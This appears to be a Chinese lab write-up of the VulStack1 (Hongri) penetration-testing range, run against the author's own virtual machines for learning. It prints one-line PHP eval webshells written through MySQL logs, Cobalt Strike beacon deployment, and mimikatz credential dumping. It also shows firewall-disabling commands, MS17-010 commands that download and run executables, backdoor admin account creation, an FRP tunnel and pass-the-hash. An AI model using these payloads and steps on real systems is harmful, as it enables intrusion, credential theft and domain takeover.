红日靶机系列是完全模拟ATT&CK攻击链路来搭建的，通过练习真实的APT实战环境我们可以从中快速成长。VulStack1
是该系列的第一个靶场，主要涉及信息收集、漏洞利用、CS上线、搭建隧道以及域内渗透等知识。

## 0x01 靶机环境搭建

靶场中包含三台靶机，具体的网络拓扑图如下  
![截屏2022-05-22
03.02.11](https://image.3001.net/images/20220524/1653326981_628bc4852c94e791c010a.png!small)

从上图可知我们需要模拟内网和外网两个网段，因此我们需要在 VMware 中选择虚拟网络编辑器设置内网网段`192.168.52.0/24`  
![截屏2022-05-22
上午3.15.28](https://image.3001.net/images/20220524/1653326982_628bc48632638f9bdff49.png!small)

完成后为三台靶机在主机网卡中添加`VMnet2`，与此同时还需要为 Web 服务器添加桥接网卡作为外网网段。  
![截屏2022-05-22
上午3.07.51](https://image.3001.net/images/20220524/1653326983_628bc4878b0c9cc14330f.png!small)

三台靶机的默认开机密码都为`hongrisec@2019`，登录后提示需要修改密码信息，因此根据需要我们将其修改为`Mac123456`，最终我们的靶机IP分布如下。

靶机名称| IP地址  
---|---  
Web服务器| 192.168.0.112/192.168.52.143  
域内主机| 192.168.52.141  
域控主机| 192.168.52.138  
  
尝试 ping 通各个主机后找到 phpstudy 开启 Web 服务模拟 Web 服务  
![截屏2022-05-22
上午3.22.17](https://image.3001.net/images/20220524/1653326985_628bc489e6ab6193f740d.png!small)

同时我们需要保持外网、域网络防火墙为未开启状态  
![截屏2022-05-22
上午6.15.39](https://image.3001.net/images/20220524/1653326988_628bc48c01103863b70ee.png!small)

正常访问站点，说明环境成功搭建完成  
![截屏2022-05-22
03.30.53](https://image.3001.net/images/20220524/1653326989_628bc48d833dd1aecd299.png!small)

## 0x02 外网边界突破

### 信息收集

使用 Nmap 扫描 web 服务器的端口开放情况

    
    
    nmap -Pn -sV -p- -A 192.168.0.112 --min-rate=1000
    

![截屏2022-05-22
03.42.54](https://image.3001.net/images/20220524/1653326991_628bc48fc86462506d8e2.png!small)

#### 80端口

访问后为 phpStudy 探针，在页面中使用弱口令 root/root 能够成功登录 MySQL 数据库  
![截屏2022-05-22
03.41.26](https://image.3001.net/images/20220524/1653326993_628bc4916186af6ad8ea2.png!small)

使用 dirsearch 对站点进行目录扫描

    
    
    dirsearch -u http://192.168.0.112 -e *
    

![截屏2022-05-22
03.44.21](https://image.3001.net/images/20220524/1653326994_628bc4926ddd1d3369e93.png!small)

成功发现目录`phpmyadmin`并访问，页面为数据库管理工具 PHPMyAdmin  
![截屏2022-05-22
03.46.13](https://image.3001.net/images/20220524/1653326995_628bc493bf684030362fc.png!small)

使用 dirsearch 继续扫描备份文件

    
    
    dirsearch -u http://192.168.0.112 -w /usr/local/share/dicts/fuzzDicts_TheKingOfDuck/directoryDicts/top7000.txt
    

![截屏2022-05-22
04.09.07](https://image.3001.net/images/20220524/1653326997_628bc4952a0a7d58f3082.png!small)

成功发现备份文件`beifen.rar`，解压后发现这是 xycms 的备份源码  
![截屏2022-05-22
04.11.17](https://image.3001.net/images/20220524/1653326998_628bc496451469fb94343.png!small)

#### 3306端口

尝试使用 hydra 爆破 MySQL 数据库密码，但是目标不允许连接数据库

    
    
    hydra -L /usr/local/share/dicts/fuzzDicts_TheKingOfDuck/passwordDict/ServiceWeakPass/mysql弱口令/mysql-user.txt -P /usr/local/share/dicts/fuzzDicts_TheKingOfDuck/passwordDict/ServiceWeakPass/mysql弱口令/mysql-pass.txt mysql://192.168.0.112 -e nsr -vV
    

![截屏2022-05-22
04.21.04](https://image.3001.net/images/20220524/1653326999_628bc49755c50c9413afd.png!small)

### MySQL日志写入木马

通过弱口令`root/root`可成功登录 PHPMyAdmin 的后台  
![截屏2022-05-22
04.25.04](https://image.3001.net/images/20220524/1653327000_628bc4986e27f45836dbd.png!small)

执行SQL语句查看是否存在写入权限，`secure_file_priv`显示为 NULL

    
    
    show variables like '%secure_file%';
    

![截屏2022-05-22
04.26.35](https://image.3001.net/images/20220524/1653327002_628bc49a5885a2b8e3e9a.png!small)

如果我们通过`into outfile`来写入木马，那么由于`secure_file_priv`的限制会导致这种方案并不可行

    
    
    select '<?php eval($_POST[cmd]);?>' into outfile 'C:/phpStudy/www/mac.php';
    

![截屏2022-05-22
04.36.24](https://image.3001.net/images/20220524/1653327003_628bc49b590e53e78eed9.png!small)

因此我们需要通过日志来写入木马，尝试开启日志记录

    
    
    set global general_log = "ON";
    

![截屏2022-05-22
04.38.45](https://image.3001.net/images/20220524/1653327004_628bc49c50ebf5866c177.png!small)

查看日志记录文件

    
    
    show variables like "general%";
    

![截屏2022-05-22
04.39.55](https://image.3001.net/images/20220524/1653327005_628bc49d4e3688dfe5fa3.png!small)

修改日志记录文件为木马文件

    
    
    set global general_log_file="C:/phpStudy/www/mac.php";
    

![截屏2022-05-22
04.44.13](https://image.3001.net/images/20220524/1653327006_628bc49e767080a64da6b.png!small)

写入木马至指定日志记录文件当中

    
    
    select '<?php eval($_POST["mac"]);?>'
    

![截屏2022-05-22
04.46.17](https://image.3001.net/images/20220524/1653327007_628bc49f86050789761fb.png!small)

成功通过蚁剑连接木马文件  
![截屏2022-05-22
04.47.54](https://image.3001.net/images/20220524/1653327008_628bc4a0a818db7e634e0.png!small)

### YXCMS后台上传木马

在源码中解压后发现`yxcms`目录并尝试访问，访问后发现页面为 YXCMS  
![截屏2022-05-22
04.53.22](https://image.3001.net/images/20220524/1653327009_628bc4a1ee31ec46f0798.png!small)

由于 YXCMS 的默认后台为`index.php?r=admin`，我们尝试访问该后台地址  
![截屏2022-05-22
04.55.46](https://image.3001.net/images/20220524/1653327015_628bc4a7a632edcf52b41.png!small)

使用 BurpSuite 截取数据包，复用验证码尝试爆破密码  
![截屏2022-05-22
04.59.29](https://image.3001.net/images/20220524/1653327017_628bc4a9162e9d8e89530.png!small)

成功爆破出 admin 密码为 123456，使用该账户密码成功登录后台

![截屏2022-05-22
05.03.25](https://image.3001.net/images/20220524/1653327019_628bc4ab97ce07a373540.png!small)

选择前台模版并在`index_index.php`插入木马

![截屏2022-05-22
05.07.10](https://image.3001.net/images/20220524/1653327021_628bc4ad84af8162659ba.png!small)

保存成功后使用蚁剑连接木马文件

![截屏2022-05-22
05.09.03](https://image.3001.net/images/20220524/1653327023_628bc4af4dc67d6212b79.png!small)

## 0x03 内网信息探测

### CS上线云服务器

在蚁剑中执行命令发现当前用户为域管理员，那么可以省去提权过程并直接上线CS

![截屏2022-05-22
05.17.59](https://image.3001.net/images/20220524/1653327024_628bc4b0632526fe6d155.png!small)

在CS中开启 http 监听器并生成利用程序`mac1.exe`  
![截屏2022-05-22
05.26.08](https://image.3001.net/images/20220524/1653327025_628bc4b186708a457036f.png!small)

上传木马后并在命令行中直接执行  
![截屏2022-05-22
05.28.14](https://image.3001.net/images/20220524/1653327027_628bc4b311e6a2d7aa1bf.png!small)

成功上线CS  
![截屏2022-05-22
05.29.18](https://image.3001.net/images/20220524/1653327028_628bc4b47e928489fa9b8.png!small)

### 本机基础环境信息收集

减少回连时间为3秒并查看网络连接情况

    
    
    sleep 3
    shell ipconfig
    

![截屏2022-05-22
05.45.37](https://image.3001.net/images/20220524/1653327029_628bc4b59ce2aa4997ade.png!small)

如果有需要的话可以关闭防火墙

    
    
    netsh firewall set opmode mode=disable
    netsh advfirewall set allprofiles state off
    

成功发现目标存在两个网段，说明内网网段中可能存在其他主机

    
    
    192.168.0.0/24 
    192.168.52.0/24
    

运行 mimikatz 成功获得管理员密码为`Mac123456`

    
    
    logonpasswords
    

![截屏2022-05-22
05.45.04](https://image.3001.net/images/20220524/1653327031_628bc4b7220d4dce2e86a.png!small)

成功获取用户哈希值

    
    
    hashdump
    

![截屏2022-05-22
05.47.57](https://image.3001.net/images/20220524/1653327032_628bc4b8121f3a8491961.png!small)

    
    
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    

借助梼杌插件通过 ms14-058 可直接将权限提升至 SYSTEM  
![截屏2022-05-22
05.55.05](https://image.3001.net/images/20220524/1653327033_628bc4b92edc7997b4596.png!small)

成功上线 SYSTEM 系统管理员  
![截屏2022-05-22
05.55.57](https://image.3001.net/images/20220524/1653327034_628bc4ba5ecae1453baa3.png!small)

### 内网域环境信息收集

内网信息收集的目的是查找域控以及其他域内主机，以下为常见的内网信息收集命令

    
    
    net view                 # 查看局域网内其他主机名
    net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
    net user                 # 查看本机用户列表
    net user /domain         # 查看域用户
    net localgroup administrators # 查看本地管理员组（通常会有域用户）
    net view /domain         # 查看有几个域
    net user 用户名 /domain   # 获取指定域用户的信息
    net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
    net group 组名 /domain    # 查看域中某工作组
    net group "domain admins" /domain  # 查看域管理员的名字
    net group "domain computers" /domain  # 查看域中的其他主机名
    net group "doamin controllers" /domain  # 查看域控制器主机名（可能有多台）
    

首先我们需要判断当前域名是什么？判断的方式有许多种，以下为常用的几种方式

    
    
    shell ipconfig /all
    

![截屏2022-05-22
06.03.54](https://image.3001.net/images/20220524/1653327035_628bc4bb6825df2c1c892.png!small)

    
    
    shell net config workstation
    

![截屏2022-05-22
06.04.51](https://image.3001.net/images/20220524/1653327036_628bc4bc89f1244d016e3.png!small)

成功探测到当前域名为`god.org`，接下来需要探索目标存在多少域

    
    
    shell net view /domain
    

![截屏2022-05-22
06.06.59](https://image.3001.net/images/20220524/1653327037_628bc4bd94e5ce1bdc263.png!small)

结果显示目标只存在`GOD`域，而`WORKGROUP`只是工作组而已。然后尝试寻找域控主机名

    
    
    shell net group "domain controllers" /domain
    

![截屏2022-05-22
15.02.00](https://image.3001.net/images/20220524/1653327038_628bc4bea0ea9b297fc14.png!small)

> 结果显示报错`RPC 服务器不可用`，这是什么原因造成的呢？

原来是目标无法完成域名解析，因此我们可以在外网网卡中设置 DNS 服务器为域控

![截屏2022-05-22
下午3.07.10](https://image.3001.net/images/20220524/1653327039_628bc4bfb4693a7eacb7e.png!small)

再次寻找域控并确认域控主机名为`OWA`  
![截屏2022-05-22
15.34.04](https://image.3001.net/images/20220524/1653327041_628bc4c13efac703bba19.png!small)

有了域控主机名以后我们尝试寻找其他域内主机

    
    
    net view
    

![截屏2022-05-22
15.36.44](https://image.3001.net/images/20220524/1653327042_628bc4c22cb0039ff674c.png!small)

    
    
    shell net group "domain computers" /domain
    

![截屏2022-05-22
15.38.27](https://image.3001.net/images/20220524/1653327043_628bc4c30a6843e5df87a.png!small)

至此内网信息搜集完毕，域内主机的分布如下，我们需要进一步完成横向渗透

主机名| IP地址| 是否为域控  
---|---|---  
OWA| 192.168.52.138| 是  
ROOT-TVI862UBEH| 192.168.52.141| 否  
STU1| 192.168.52.143| 否  
  
## 0x03 内网横向渗透

### 建立FRP代理隧道

为了更好地模拟真实环境，我们可以通过在云服务器上搭建 FRP 隧道访问目标内网。

#### FRP配置

`frps.ini`配置：

    
    
    [common]
    bind_addr = 0.0.0.0
    bind_port = 7000
    token = macmacmac12345678
    

`frpc.ini`配置：

    
    
    [common]
    server_addr=x.x.x.x
    server_port = 7000
    token = macmacmac12345678
    [http_proxy]
    type = tcp
    remote_port = 6000
    plugin = socks5
    

#### FRP连接

在云服务器上启动 FRP

    
    
    ./frps -c frps.ini
    

![截屏2022-05-22
下午5.04.08](https://image.3001.net/images/20220524/1653327043_628bc4c3ef2bbbf73d1f7.png!small)

上传 FRP 至靶机后查看文件  
![截屏2022-05-22
17.12.26](https://image.3001.net/images/20220524/1653327044_628bc4c4d555c29c4ca95.png!small)

在 CS 上启动连接

    
    
    shell frpc.exe -c frpc.ini
    

![截屏2022-05-22
17.13.43](https://image.3001.net/images/20220524/1653327046_628bc4c695098685ecbb8.png!small)

在本地设置 proxychains 连接目标的6000端口建立 FRP 隧道

    
    
    vim /usr/local/etc/proxychains.conf
    #配置
    socks5 x.x.x.x 6000
    

![截屏2022-05-22
17.28.19](https://image.3001.net/images/20220524/1653327047_628bc4c77ac8e52754192.png!small)

使用 nmap 扫描内网主机进行测试，连接成功说明隧道建立成功

    
    
    proxychains4 nmap 192.168.52.138 -p 135,445,80
    

![截屏2022-05-22
17.25.07](https://image.3001.net/images/20220524/1653327048_628bc4c85cc43a338ae5f.png!small)

### MSF永恒之蓝漏洞利用

#### FSCAN漏洞扫描

在 CS 中上传 fsacn 并设置扫描目标

    
    
    ## hosts.txt
    192.168.52.138
    192.168.52.141
    192.168.52.143
    

![截屏2022-05-22
17.49.14](https://image.3001.net/images/20220524/1653327049_628bc4c9bba64a8f915a3.png!small)

使用 fscan 扫描目标，结果显示全部目标都存在 MS17-010 漏洞

    
    
    shell fscan64.exe -hf hosts.txt
    

![截屏2022-05-22
17.53.05](https://image.3001.net/images/20220524/1653327051_628bc4cb1e70c108a0f72.png!small)

#### 域控主机上线CS

在 CS 的会话当中设置新的监听器用于上线内网主机

![截屏2022-05-22
17.59.14](https://image.3001.net/images/20220524/1653327052_628bc4cc634a733ec989e.png!small)

需要注意的是在设置监听器时需要确认内网代理主机的IP地址，否则会导致内网主机无法连接

![截屏2022-05-22
18.00.22](https://image.3001.net/images/20220524/1653327053_628bc4cd93eab7939c513.png!small)

借用该监听器生成相应木马`mac2.exe`  
![截屏2022-05-22
18.06.45](https://image.3001.net/images/20220524/1653327055_628bc4cf37e053ed18c52.png!small)

成功将该木马上传至目标的站点目录  
![截屏2022-05-22
18.09.21](https://image.3001.net/images/20220524/1653327056_628bc4d0877221cced453.png!small)

在本地开启 MSF 并设置代理

    
    
    msfconsole
    msf > setg Proxies socks5:x.x.x.x:6000
    msf > setg ReverseAllowProxy true
    

![截屏2022-05-22
18.13.35](https://image.3001.net/images/20220524/1653327057_628bc4d1b2ea498a306f3.png!small)

使用 MSF 执行命令上线 CS

    
    
    msf > use auxiliary/admin/smb/ms17_010_command
    msf > set command "powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.52.143/mac2.exe','mac2.exe');start-process mac2.exe"
    msf > set rhosts 192.168.52.138
    msf > show options
    msf > run
    

![截屏2022-05-22
18.21.18](https://image.3001.net/images/20220524/1653327058_628bc4d2e1e525b2c8655.png!small)

域控主机成功上线CS  
![截屏2022-05-22
18.21.33](https://image.3001.net/images/20220524/1653327060_628bc4d45db3e93d4251d.png!small)

#### 域内主机上线CS

在使用 MS17-010 攻击域内主机时 CS 无法上线，这是因为该主机为 Windows Server 2003，我们无法使用 powershell
执行命令，与此同时该操作系统为 X86 架构，对应需要使用32位的木马。因此我们需要使用 CS 生成32位木马`mac3.exe`  
![截屏2022-05-22
19.41.01](https://image.3001.net/images/20220524/1653327061_628bc4d571a513a1fa4df.png!small)

同样地我们将其上传至目标的站点目录  
![截屏2022-05-22
19.42.36](https://image.3001.net/images/20220524/1653327062_628bc4d6ca5dfa6159275.png!small)

重新设置命令使用 certutil 下载木马，但是目标返回报错信息

    
    
    msf > set command "certutil.exe -urlcache -split -f http://192.168.52.143/mac3.exe mac3.exe"
    msf > set rhosts 192.168.52.141
    msf > show options
    msf > run
    

![截屏2022-05-22
20.19.41](https://image.3001.net/images/20220524/1653327064_628bc4d8231ff996ecfd0.png!small)

那么我们换一种思路，尝试通过永恒之蓝创建管理员账户

    
    
    net user mac QWEasd123 /add
    net localgroup "administrators" mac /add
    net user mac
    

![截屏2022-05-22
20.29.43](https://image.3001.net/images/20220524/1653327065_628bc4d9defbd072fb156.png!small)

尝试使用新建管理员通过`IPC$`进行连接，但目标无法连接

    
    
    shell net use \\192.168.52.141\ipc$ "QWEasd123" /user:mac
    

![截屏2022-05-22
20.35.42](https://image.3001.net/images/20220524/1653327067_628bc4db8d6ed4b59ad8d.png!small)

尝试使用域管理员进行登录，目标连接成功

    
    
    shell net use \\192.168.52.141\ipc$ "Mac123456" /user:Administrator
    shell net use
    

![截屏2022-05-22
21.14.02](https://image.3001.net/images/20220524/1653327068_628bc4dc792950b1ba419.png!small)

将木马复制到域内主机的C盘目录当中

    
    
    shell cd .. && copy mac3.exe \\192.168.52.141\c$
    

![截屏2022-05-22
21.18.54](https://image.3001.net/images/20220524/1653327069_628bc4dd54a1152625003.png!small)

在 MSF 中通过 MS17-010 执行木马

    
    
    msf > set command "C:\\mac3.exe"
    msf > show options
    msf > run
    

![截屏2022-05-22
21.22.49](https://image.3001.net/images/20220524/1653327070_628bc4de4721db18fedf2.png!small)

域内主机成功上线CS  
![截屏2022-05-22
21.23.49](https://image.3001.net/images/20220524/1653327071_628bc4df79eecee9554ba.png!small)

![截屏2022-05-22
21.32.17](https://image.3001.net/images/20220524/1653327072_628bc4e0873b84cf6b18a.png!small)

### 域管理员凭证传递利用

#### 凭证传递利用原理

通过域管理员的凭证可以快速拿下目标域环境，在 CS 中还给我们提供了 SMB Beacon，它主要通过 SMB 协议建立连接，使用命名管道通过父级
Beacon 进行通讯，当两个 Beacons 链接后，子 Beacon 会从父 Beacon 获取到任务并发送。因为链接的 Beacon 使用
Windows 命名管道进行通信，因此流量封装在 SMB 协议中，所以 SMB Beacon 相对隐蔽，绕防火墙时可能发挥奇效。

#### 凭证传递上线CS

在 CS 的会话中建立 SMB 监听器用于快速传递凭证  
![截屏2022-05-22
21.51.39](https://image.3001.net/images/20220524/1653327073_628bc4e1e0471f27d3b96.png!small)

在`Targets`中选择 psexec_psh 传递哈希值  
![截屏2022-05-22
21.58.18](https://image.3001.net/images/20220524/1653328940_628bcc2cda86cb8852f24.png!small)

选择会话并设置 SMB 监听器  
![截屏2022-05-22
21.56.37](https://image.3001.net/images/20220524/1653327136_628bc5202b48236183b61.png!small)

域控主机成功上线CS  
![截屏2022-05-22
22.00.10](https://image.3001.net/images/20220524/1653327138_628bc522612dbc01df638.png!small)

同样利用该方法无法上线域内主机，这主要是因为目标没有 powershell 环境，我们可以通过 psexec 方式来传递哈希  
![截屏2022-05-22
22.08.04](https://image.3001.net/images/20220524/1653327139_628bc52349233b49a4064.png!small)

域内主机成功上线CS  
![截屏2022-05-22
22.05.52](https://image.3001.net/images/20220524/1653327140_628bc52453596dc1dcf30.png!small)

![截屏2022-05-22
22.09.14](https://image.3001.net/images/20220524/1653327141_628bc5258bebb696a84e0.png!small)

## 0x04 靶场学习总结

这是我第二次做该靶场，第一次做的时候只采用了凭证传递的利用方式，并没有考虑 MS17-010
漏洞利用，也没有采用隧道的方式来访问内网，经过这些天的考虑后我决定重做温习一遍，一是重新整理一下思路；二是锻炼一下内网渗透思路。当然在练习过程中我也遇到了许多问题，比如
certutil.exe 怎么无法在 Windows Server 2003 中传递保存木马文件、FTP
匿名登录漏洞如何通过代理登录利用等，显然这些问题在打靶记录中未直接体现。但它们对渗透思路的打磨有很大帮助。同时非常感谢红日团队以及前辈的实践，我将继续对后续靶场进行研究学习。

